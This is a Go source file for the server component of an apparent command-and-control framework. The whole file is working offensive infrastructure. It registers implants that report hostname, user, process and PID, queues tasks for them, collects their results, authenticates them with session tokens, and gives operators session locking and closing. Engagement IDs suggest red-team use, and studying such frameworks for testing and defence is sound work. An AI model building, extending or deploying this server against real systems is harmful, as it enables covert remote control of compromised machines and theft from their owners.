package c2

import (
	"crypto/rand"
	"crypto/subtle"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/azizbinmohammad/private-c2/pkg/envelope"
	"github.com/azizbinmohammad/private-c2/pkg/protocol"
	"github.com/google/uuid"
)

// ImplantSession holds metadata about a connected implant.
type ImplantSession struct {
	ID              string    `json:"id"`
	ImplantID       string    `json:"implant_id"`
	Hostname        string    `json:"hostname"`
	Username        string    `json:"username"`
	OS              string    `json:"os"`
	Arch            string    `json:"arch"`
	PID             int       `json:"pid"`
	Process         string    `json:"process"`
	Mode            string    `json:"mode"`
	RemoteAddr      string    `json:"remote_addr"`
	Transport       string    `json:"transport"`
	EngagementID    string    `json:"engagement_id,omitempty"`
	ProtocolVersion int       `json:"protocol_version"`
	Capabilities    []string  `json:"capabilities,omitempty"`
	LastCheckin     time.Time `json:"last_checkin"`
	CreatedAt       time.Time `json:"created_at"`

	// LockedBy is the operator currently holding this session, or "" when
	// unlocked. It lives in memory because a lock only means anything while
	// the session is connected.
	LockedBy string `json:"locked_by"`

	// SessionToken authenticates stateless carriers (v2). It is never exposed
	// through the operator API.
	SessionToken string `json:"-"`

	conn net.Conn
}

// Task represents a pending task for an implant.
type Task struct {
	ID        string    `json:"id"`
	Type      string    `json:"type"`
	Args      string    `json:"args"`
	SessionID string    `json:"session_id"`
	CreatedAt time.Time `json:"created_at"`
}

// TaskResult stores a completed task result.
type TaskResult struct {
	TaskID      string    `json:"task_id"`
	SessionID   string    `json:"session_id"`
	Success     bool      `json:"success"`
	Output      string    `json:"output"`
	Error       string    `json:"error"`
	CompletedAt time.Time `json:"completed_at"`
}

// ImplantServer manages implant connections, task dispatch and listeners.
type ImplantServer struct {
	mu          sync.RWMutex
	sessions    map[string]*ImplantSession
	taskQueues  map[string][]*Task
	taskResults map[string]*TaskResult
	// taskOwners binds a dispatched task to the session that received it.
	// Result messages are untrusted input; a task ID from one implant must
	// never be able to overwrite another implant's result.
	taskOwners map[string]string
	listeners  map[string]*runningListener
}

const (
	// maxQueueDepth bounds a single session's pending task queue.
	maxQueueDepth = 1000
	// maxStoredResults bounds completed results held for live sessions.
	maxStoredResults = 10000
)

// NewImplantServer creates a new ImplantServer.
func NewImplantServer() *ImplantServer {
	return &ImplantServer{
		sessions:    make(map[string]*ImplantSession),
		taskQueues:  make(map[string][]*Task),
		taskResults: make(map[string]*TaskResult),
		taskOwners:  make(map[string]string),
		listeners:   make(map[string]*runningListener),
	}
}

// HandleConnection manages the lifecycle of a single implant connection.
// It reads the registration message, then loops handling checkins and results.
const registrationTimeout = 30 * time.Second

func (s *ImplantServer) HandleConnection(conn net.Conn) {
	defer conn.Close()
	remoteAddr := conn.RemoteAddr().String()

	// A peer that never completes registration must not hold a goroutine or a
	// file descriptor indefinitely. The deadline is cleared after the ack.
	if err := conn.SetReadDeadline(time.Now().Add(registrationTimeout)); err != nil {
		log.Printf("[c2] %s: set registration deadline: %v", remoteAddr, err)
		return
	}

	// Step 1: Read the first frame, expect a "register" message.
	frame, err := envelope.ReadFrame(conn)
	if err != nil {
		log.Printf("[c2] failed to read registration frame from %s: %v", remoteAddr, err)
		return
	}

	var msg protocol.Message
	if err := json.Unmarshal(frame, &msg); err != nil {
		log.Printf("[c2] invalid JSON from %s: %v", remoteAddr, err)
		return
	}

	if msg.Type != "register" {
		log.Printf("[c2] expected register from %s, got %q", remoteAddr, msg.Type)
		return
	}

	var reg protocol.RegisterData
	if err := json.Unmarshal(msg.Data, &reg); err != nil {
		log.Printf("[c2] invalid register data from %s: %v", remoteAddr, err)
		return
	}

	// An implant that reconnects must not leave a second live session behind:
	// that would split its task queue and session lock across two entries.
	pending, lockedBy := s.supersedeByImplantID(reg.ImplantID)

	sessionID := uuid.New().String()
	negotiated := protocol.Negotiate(reg.ProtocolVersion)
	session := &ImplantSession{
		ID:              sessionID,
		ImplantID:       reg.ImplantID,
		Hostname:        reg.Hostname,
		Username:        reg.Username,
		OS:              reg.OS,
		Arch:            reg.Arch,
		PID:             reg.PID,
		Process:         reg.Process,
		Mode:            reg.Mode,
		RemoteAddr:      remoteAddr,
		Transport:       "mtls",
		EngagementID:    reg.EngagementID,
		ProtocolVersion: negotiated,
		Capabilities:    append([]string(nil), reg.Capabilities...),
		LastCheckin:     time.Now(),
		CreatedAt:       time.Now(),
		LockedBy:        lockedBy,
		SessionToken:    newSessionToken(),
		conn:            conn,
	}

	s.mu.Lock()
	s.sessions[sessionID] = session
	if len(pending) > 0 {
		s.taskQueues[sessionID] = append(s.taskQueues[sessionID], pending...)
	}
	s.mu.Unlock()

	log.Printf("[c2] new session %s from %s (%s@%s, protocol v%d)", sessionID, remoteAddr, reg.Username, reg.Hostname, negotiated)

	// Send register_ack. v1 peers receive only the original fields; unknown
	// fields are ignored by JSON decoders either way.
	ack := protocol.RegisterAckData{
		SessionID:       sessionID,
		Interval:        5000,
		HeartbeatMs:     5000,
		MaxTasks:        100,
		ProtocolVersion: negotiated,
	}
	if negotiated >= protocol.Version2 {
		ack.Capabilities = []string{
			protocol.CapabilityKill,
			protocol.CapabilityTaskStarted,
			protocol.CapabilitySessionToken,
		}
		ack.SessionToken = session.SessionToken
	}
	if err := s.sendMessage(conn, "register_ack", ack); err != nil {
		log.Printf("[c2] failed to send register_ack to %s: %v", sessionID, err)
		s.removeSession(sessionID)
		return
	}

	// Registration is complete. Clear the handshake deadline; the listener's
	// idle policy (or the operator closing the session) bounds the loop.
	if err := conn.SetReadDeadline(time.Time{}); err != nil {
		log.Printf("[c2] session %s: clear read deadline: %v", sessionID, err)
	}

	// Step 2: Enter message loop.
	for {
		frame, err := envelope.ReadFrame(conn)
		if err != nil {
			log.Printf("[c2] session %s read error: %v", sessionID, err)
			break
		}

		var loopMsg protocol.Message
		if err := json.Unmarshal(frame, &loopMsg); err != nil {
			log.Printf("[c2] session %s invalid JSON: %v", sessionID, err)
			continue
		}

		switch loopMsg.Type {
		case "checkin":
			s.handleCheckin(conn, sessionID, loopMsg.Data)
		case "result":
			s.handleResult(conn, sessionID, loopMsg.Data)
		case "task_started":
			s.handleTaskStarted(sessionID, loopMsg.Data)
		default:
			log.Printf("[c2] session %s unknown message type: %s", sessionID, loopMsg.Type)
		}
	}

	s.removeSession(sessionID)
	log.Printf("[c2] session %s disconnected", sessionID)
}

// supersedeByImplantID removes an older session for the same implant and
// returns its queued tasks and lock so they can be transferred to the new
// connection. The old connection is closed outside the server lock.
func (s *ImplantServer) supersedeByImplantID(implantID string) (pending []*Task, lockedBy string) {
	if implantID == "" {
		return nil, ""
	}

	s.mu.Lock()
	var old *ImplantSession
	for id, sess := range s.sessions {
		if sess.ImplantID != implantID {
			continue
		}
		old = sess
		pending = append([]*Task(nil), s.taskQueues[id]...)
		lockedBy = sess.LockedBy
		s.removeSessionLocked(id)
		break
	}
	s.mu.Unlock()

	if old != nil {
		if old.conn != nil {
			_ = old.conn.Close()
		}
		log.Printf("[c2] superseded session %s for implant %s", old.ID, implantID)
	}
	return pending, lockedBy
}

// newSessionToken returns a random 256-bit token used by stateless carriers.
func newSessionToken() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		log.Printf("[c2] generate session token: %v", err)
		return ""
	}
	return hex.EncodeToString(b)
}

func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json.RawMessage) {
	var checkin protocol.CheckinData
	if len(data) > 0 {
		if err := json.Unmarshal(data, &checkin); err != nil {
			log.Printf("[c2] session %s: invalid checkin data: %v", sessionID, err)
			return
		}
	}

	s.mu.Lock()
	sess, ok := s.sessions[sessionID]
	if !ok {
		s.mu.Unlock()
		return
	}
	sess.LastCheckin = time.Now()

	// Stateless carriers and v2 peers must present the session token. Legacy
	// v1 peers have no token and remain supported.
	if sess.ProtocolVersion >= protocol.Version2 {
		if !tokensEqual(sess.SessionToken, checkin.SessionToken) {
			s.mu.Unlock()
			log.Printf("[c2] session %s: rejected checkin with invalid session token", sessionID)
			return
		}
	}

	// Take the queue, but remember it until the tasking write succeeds. A
	// failed write used to lose every pending task.
	pending := s.taskQueues[sessionID]
	s.taskQueues[sessionID] = nil
	for _, t := range pending {
		s.taskOwners[t.ID] = sessionID
	}
	s.mu.Unlock()

	// Build tasking response.
	tasks := make([]protocol.TaskWire, 0, len(pending))
	for _, t := range pending {
		tasks = append(tasks, protocol.TaskWire{ID: t.ID, Type: t.Type, Args: t.Args})
	}

	tasking := protocol.TaskingData{Tasks: tasks}
	if err := s.sendMessage(conn, "tasking", tasking); err != nil {
		// Put the tasks back at the front of the queue so the next checkin
		// retries them, and clear the ownership records.
		s.mu.Lock()
		s.taskQueues[sessionID] = append(pending, s.taskQueues[sessionID]...)
		for _, t := range pending {
			delete(s.taskOwners, t.ID)
		}
		s.mu.Unlock()
		log.Printf("[c2] session %s: failed to send tasking (requeued %d tasks): %v", sessionID, len(pending), err)
	}
}

func (s *ImplantServer) handleResult(conn net.Conn, sessionID string, data json.RawMessage) {
	var res protocol.ResultData
	if err := json.Unmarshal(data, &res); err != nil {
		log.Printf("[c2] session %s: invalid result data: %v", sessionID, err)
		return
	}
	if res.TaskID == "" {
		log.Printf("[c2] session %s: result without task ID", sessionID)
		return
	}

	s.mu.Lock()
	owner, known := s.taskOwners[res.TaskID]
	if !known || owner != sessionID {
		s.mu.Unlock()
		log.Printf("[c2] session %s: rejected result for task %s (owner=%q known=%v)", sessionID, res.TaskID, owner, known)
		return
	}
	delete(s.taskOwners, res.TaskID)

	// The connection is authoritative: never trust SessionID from the wire.
	result := &TaskResult{
		TaskID:      res.TaskID,
		SessionID:   sessionID,
		Success:     res.Success,
		Output:      res.Output,
		Error:       res.Error,
		CompletedAt: time.Now(),
	}
	s.taskResults[res.TaskID] = result
	s.pruneResultsLocked()
	s.mu.Unlock()

	log.Printf("[c2] session %s: result for task %s (success=%v)", sessionID, res.TaskID, res.Success)

	// Send result_ack.
	if err := s.sendMessage(conn, "result_ack", struct{}{}); err != nil {
		log.Printf("[c2] session %s: failed to send result_ack: %v", sessionID, err)
	}
}

// handleTaskStarted records that the implant has begun executing tasks. It is
// a v2 message; v1 implants never send it.
func (s *ImplantServer) handleTaskStarted(sessionID string, data json.RawMessage) {
	var started protocol.TaskStartedData
	if err := json.Unmarshal(data, &started); err != nil {
		log.Printf("[c2] session %s: invalid task_started data: %v", sessionID, err)
		return
	}
	s.mu.RLock()
	defer s.mu.RUnlock()
	for _, taskID := range started.TaskIDs {
		if owner, ok := s.taskOwners[taskID]; ok && owner == sessionID {
			log.Printf("[c2] session %s: task %s started", sessionID, taskID)
		}
	}
}

// pruneResultsLocked evicts the oldest completed result when the store grows
// past its bound. Callers must hold s.mu.
func (s *ImplantServer) pruneResultsLocked() {
	if len(s.taskResults) <= maxStoredResults {
		return
	}
	var oldestID string
	var oldest time.Time
	for id, res := range s.taskResults {
		if oldestID == "" || res.CompletedAt.Before(oldest) {
			oldestID, oldest = id, res.CompletedAt
		}
	}
	if oldestID != "" {
		delete(s.taskResults, oldestID)
	}
}

func tokensEqual(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	return subtle.ConstantTimeCompare([]byte(a), []byte(b)) == 1
}

func (s *ImplantServer) sendMessage(conn net.Conn, msgType string, data interface{}) error {
	dataBytes, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("marshal data: %w", err)
	}

	msg := protocol.Message{Type: msgType, Data: json.RawMessage(dataBytes)}
	frame, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal message: %w", err)
	}

	return envelope.WriteFrame(conn, frame)
}

// removeSession drops a session and everything held on its behalf. The task
// queue and any results it produced would otherwise live for the lifetime of
// the process, growing with every implant that ever connected.
func (s *ImplantServer) removeSession(sessionID string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.removeSessionLocked(sessionID)
}

func (s *ImplantServer) removeSessionLocked(sessionID string) {
	delete(s.sessions, sessionID)
	delete(s.taskQueues, sessionID)
	for taskID, owner := range s.taskOwners {
		if owner == sessionID {
			delete(s.taskOwners, taskID)
		}
	}
	for taskID, res := range s.taskResults {
		if res.SessionID == sessionID {
			delete(s.taskResults, taskID)
		}
	}
}

// ErrSessionNotFound is returned when the given session is not currently
// connected.
var ErrSessionNotFound = errors.New("session not found")

// ErrUnsupportedTaskType is returned when a task type is not in the shared
// protocol registry.
var ErrUnsupportedTaskType = errors.New("unsupported task type")

// ErrTaskQueueFull is returned when a session already has the maximum number
// of pending tasks.
var ErrTaskQueueFull = errors.New("task queue full")

// CloseSession terminates a live implant session and releases its resources.
//
// Closing the underlying connection is what ends the session: the implant's
// read loop fails and it disconnects. An implant configured to reconnect will
// dial back in and appear as a new session, which is the intended behaviour —
// this stops the session, not the implant process.
func (s *ImplantServer) CloseSession(sessionID string) error {
	s.mu.Lock()
	sess, ok := s.sessions[sessionID]
	if !ok {
		s.mu.Unlock()
		return ErrSessionNotFound
	}
	s.removeSessionLocked(sessionID)
	s.mu.Unlock()

	if sess.conn != nil {
		if err := sess.conn.Close(); err != nil {
			log.Printf("[c2] session %s: closing connection: %v", sessionID, err)
		}
	}
	log.Printf("[c2] session %s closed by operator", sessionID)
	return nil
}

// LockSession marks a session as held by the given operator.
func (s *ImplantServer) LockSession(sessionID, operator string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	sess, ok := s.sessions[sessionID]
	if !ok {
		return ErrSessionNotFound
	}
	if sess.LockedBy != "" && sess.LockedBy != operator {
		return fmt.Errorf("session is locked by %s", sess.LockedBy)
	}
	sess.LockedBy = operator
	return nil
}

// UnlockSession clears a session lock.
func (s *ImplantServer) UnlockSession(sessionID string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	sess, ok := s.sessions[sessionID]
	if !ok {
		return ErrSessionNotFound
	}
	sess.LockedBy = ""
	return nil
}

// QueueTask adds a task for the given session. Returns the new task ID.
func (s *ImplantServer) QueueTask(sessionID, taskType, args string) (string, error) {
	if !protocol.IsImplementedTaskType(taskType) {
		return "", fmt.Errorf("%w: %s", ErrUnsupportedTaskType, taskType)
	}

	s.mu.Lock()
	defer s.mu.Unlock()

	if _, ok := s.sessions[sessionID]; !ok {
		return "", fmt.Errorf("%w: %s", ErrSessionNotFound, sessionID)
	}
	if len(s.taskQueues[sessionID]) >= maxQueueDepth {
		return "", fmt.Errorf("%w for session %s", ErrTaskQueueFull, sessionID)
	}

	task := &Task{
		ID:        uuid.New().String(),
		Type:      taskType,
		Args:      args,
		SessionID: sessionID,
		CreatedAt: time.Now(),
	}

	s.taskQueues[sessionID] = append(s.taskQueues[sessionID], task)
	log.Printf("[c2] queued task %s (%s) for session %s", task.ID, taskType, sessionID)
	return task.ID, nil
}

// GetResult returns a completed task result, or nil if not yet available.
func (s *ImplantServer) GetResult(taskID string) *TaskResult {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.taskResults[taskID]
}

// snapshot returns a copy of the session that is safe to read once the server
// lock has been released. Callers marshal sessions to JSON well outside the
// lock, while the connection loop keeps writing to LastCheckin under it.
func (sess *ImplantSession) snapshot() *ImplantSession {
	copied := *sess
	return &copied
}

// ListSessions returns all currently connected sessions. The returned values
// are copies and must not be used to mutate live session state.
func (s *ImplantServer) ListSessions() []*ImplantSession {
	s.mu.RLock()
	defer s.mu.RUnlock()

	result := make([]*ImplantSession, 0, len(s.sessions))
	for _, sess := range s.sessions {
		result = append(result, sess.snapshot())
	}
	return result
}

// GetSession returns a copy of a single session by ID, or nil if it is not
// connected.
func (s *ImplantServer) GetSession(sessionID string) *ImplantSession {
	s.mu.RLock()
	defer s.mu.RUnlock()

	sess, ok := s.sessions[sessionID]
	if !ok {
		return nil
	}
	return sess.snapshot()
}
